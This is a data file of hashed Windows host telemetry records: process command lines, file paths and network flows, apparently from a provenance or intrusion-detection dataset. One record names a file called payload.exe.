867f9ca868ed3eb6b12e56e9ff1befdede98705ed540edd9f564c369126cf611,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe $(Arg0)'},471121
49ddc3ac7e81964e3b7128d382c25833f01994482dd9474ab2807a3903ee95ed,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},473679
6958cdcf8e6cb72b5bfbd6fcb61f6e20472005cd80597f9e3c71f0047bfed09f,{'subject': 'c:/windows/system32/sc.exe C:/Windows/system32/sc.exe start w32time task_started'},471118
1c205bce21bc0cd2ddc8d442e9087fe0af3c3aad991016e19bb03fa26b5935f3,{'subject': 'c:/windows/system32/werfault.exe werfault.exe /h /shared Global/fa145d01437842be9cae200f7cf2c642'},470100
1ec06d411d0a94385ec6cd8d5b0bfac4e80654656dabe379fea15fb506c27eff,{'subject': 'c:/windows/system32/lsass.exe C:/Windows/system32/lsass.exe'},470101
b93f6d93f15b971705003609c99e8b490f9ddefbc82450375953f721908a759a,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1454781919665776027409471252-1463007811582918458327113294-8383078871910407818'},471126
1ab5ad9a51abfe7b0a78bfda9162bd6843a501ec1752072547ce4c90f4a2b61c,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},470102
6c04df483dd41ba51ed5874ad4c3385f50956ae2415141caf8c967186847128c,{'file': 'c:/users/aalsahee/payload.exe'},425573
719327ab3df2156c965167a5a17c6e045670be3c9a1488727da882ca50d78d2a,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473716
3afcd50281bbb6d2db58584fd67eafbc7ac64f1301d132e63d4369cb87d1d112,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},473719
aefdf16c043414d10571c7e7d61521885f96c9b62d1319265f081739078706a0,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},473720
6b8bdc2dfb0c7f221ff28b88d9a331c0fab3892cf2d544be7334f95d644ca5e6,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 728820431-193461325019446751005937004352857795001894683291-95413493-644488165'},473721
aacfcc329737f9cea53db3197529d7a1200614dd263fa530e47f5165bc43ea9e,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},473724
2f9464c6cc4a160caae7e6f98b2f7fc6cba50c972175599f52a83e084922a4d2,{'netflow': '192.168.223.128:50078->34.107.221.82:80'},471677
0054e5f2c0e98b0edb57d95f3c88e7401497a2864e5c1ee5cd96d5bd3b2e3012,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 12403630871843726068-46206208617490045611014032448585192353-2481859871912781597'},473725
accf080ec435a29c77d5698a345d776beae8506682a62d3bdd12fa2279cbf32c,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}'},473727
0f7df5ed22afe9972d5eb5a3de57d5984d63fa395aa7db2e4848e27ea91f55a1,{'file': 'c:/windows/sysmon.exe'},85119
1f5ccb718cff65b4dd2cf0542c324fa3c3cda8a8fb4e02e36b8100ca0b2ee358,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k LocalSystemNetworkRestricted'},470162
f3e69cf5422b7e90fe3dcedc417393f3640f0a95a5491ee16f91909cf0e52c68,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},470163
dbd6f8eee20e371709c9eaf4af930749cca00182eb63f48603dac0f42c31487b,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k LocalServiceNetworkRestricted'},470169
9fc46fecd79f5630f16d281052bd75f52ab90b26abc206c334c7d8e46d74c455,{'file': 'c:/windows/system32/dllhost.exe'},77472
4fb7fe201439f5c1e9f262d2e85f5e7060612bddb799213d980ca75f12e42cd1,{'netflow': '192.168.223.128:49289->34.107.221.82:80'},473761
a33d6ac4090d4f6c90a65e29389fb41717be60ceef269e0e7596f1debb7ec9a9,{'subject': 'c:/windows/system32/lsm.exe C:/Windows/system32/lsm.exe'},471717
0a689677a786b6edca086ceefa70b8be0533effd33547226e273f00642664c41,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},471718
f7544e6c7fafe605c1e9ed5b22d4ae4dad32a14c73b0ad82e4a9dea343306272,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471719
55370c84a6e31434690b8e98ee96a473357a7683c264db697055c68d4d76a1fa,{'file': 'c:/windows/system32/mmc.exe'},78504
e2d25c55d94c564e7853d403ee7365f331774634af17a079d2bd3649b05a8740,{'file': 'c:/python27/python.exe'},1207
bdeaa7d6a1d085d4a55638b37f91b3b1b0fc02132e00923b2c70f36f812f0fd7,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},470201
519a5da286e4488ddcaff5d8d539f20aed6208e53d869dd296b92e8db5c87dcc,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471740
251afe413d10b4989f859de2902c1e5b2e384253d4a428d048d4a4ebfacc296e,{'subject': 'c:/windows/sysmon.exe C:/Windows/Sysmon.exe'},470208
920e827e22d87ad6c7a078a2ed5f2304e8eb138b6b2d72d805c347c90f22c1b4,"{'subject': 'c:/windows/system32/csrss.exe %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'}",470209
3c4203fd827faf83805cf8409448d96676cdc3fdaa3eff58ff6dc71f896c8783,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1486231104-1106063243-1384596938-1462867873-18533603131287421695-102502181-1416252299'},470210
00a283993d842930af86b30653d9414aa5201c567688b2aa5f8425438d9c0dd4,"{'subject': 'c:/program files/confer/scanner/upd.exe C:/Program Files/Confer/scanner/upd.exe  --install-dir=C:/Program Files/Confer/scanner/Data_0 --internet-srvs=http://updates2.cdc.carbonblack.io/update2 --key-dir=. --master-file=/idx/master.idx --no-config --no-dns-resolve --product-file=/idx/savapi4lib-win32-en.info.gz --quiet --update-modules-list=VDF,AVE2'}",470211
b3b81c3e669895976ec2d3a398852d82835980935e465cb7054b21b1ef614a8f,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=3900.0.709684863/854218346 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  3900 /./pipe/gecko-crash-server-pipe.3900 tab'},473292
7405d4474308b14a6568f74897ed7e90faea647730aba534aa3354d897656f36,{'file': 'c:/windows/system32/schtasks.exe'},67830
457b71eba2406e71b8ae80d5f4e7fd18148d9223243545b5670dede8493a2253,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},473340
5fd786cc5a2c51d6d371db1b30f04a41af81eb5acfeb6f8c1100d52f9db7c8c4,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe7_ Global/UsGthrCtrlFltPipeMssGthrPipe7 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},470784
8b71202901e337e2f8a552e6b75dd17b11f00ad9ec3b23937d151a7782cb5bc1,{'file': 'c:/program files/mozilla firefox/firefox.exe'},1284
d096cb842f48dde704a4765979d7d52be4e4fcd77edfa2e5430e709a2d6a93aa,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},470790
442d9c1f337b9772e5054e70ef1d23813c1416b6d274729b656cc97f78433aa4,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},469766
b151d42f07bc4291e3a61a0c891e8dbae98744baa8e1ae69701d8d7c914593b3,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x334'},471309
d14bf11d49c48da7c390661015ae1c196fcc6c690bd870162f111f92abefe861,{'file': 'c:/windows/system32/audiodg.exe'},245523
d0c61b08c6b1bc6ab5f6662450259c205861610ae17af17b3f76e7d29d464535,{'subject': 'c:/program files/confer/repmgr.exe C:/Program Files/Confer/RepMgr.exe'},469791
3ac5bcb5564466e64aa8ab3ac8bd24ecf9b408dd2b4dc20f94241478788f701d,{'subject': 'c:/program files/confer/scanner/scanhost.exe scanhost.exe'},470834
c1b3ef68785c35d696c6cb4858e30fa0d28c579dc467c7c262175020c0d9a02e,{'netflow': '192.168.223.128:50144->10.193.66.115:8080'},470840
cbe2a221c69beaeff680b631ea18cde8fd920fc24f84f1dea19e9171a2b5a4b0,{'file': 'c:/program files/microsoft office/office14/winword.exe'},1336
f5e5de63899fa603fb639254ae05b6204bc3c349af52261794b6fbdf07e71b8c,{'subject': 'c:/windows/system32/mshta.exe C:/Windows/System32/mshta.exe -Embedding'},470842
2e46575915ef8475997fec5410085520bc5e0a04340177a11cd704e69956462b,{'file': 'c:/windows/system32/lsm.exe'},124738
79cf09b6a6f4384e0ec839928f0e48780faf759279becaa509e827b5efbf3132,{'file': 'c:/windows/system32/werfault.exe'},124747
e14d5a5e73708b869dc2531e3aeb16cc50bbe92eab4a8d8d8dfc029e3c907949,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},470871
404297cdcec61adefa54feb0c8250fbb6ee631bc014842375c41b1590fb674b9,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -791083548-19581773562617740851384104673290845146-2002924840-944498995386323541'},471898
c652180a3a48efa61bad817d7707405249fb5d4212be5bba1d4f68f9e723693b,{'netflow': '192.168.223.128:50145->10.193.66.115:8080'},470875
7a2da3eb2c75aefd63a269cea94d1a58246d79db96b00efe836bff1648d7fc14,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe'},470874
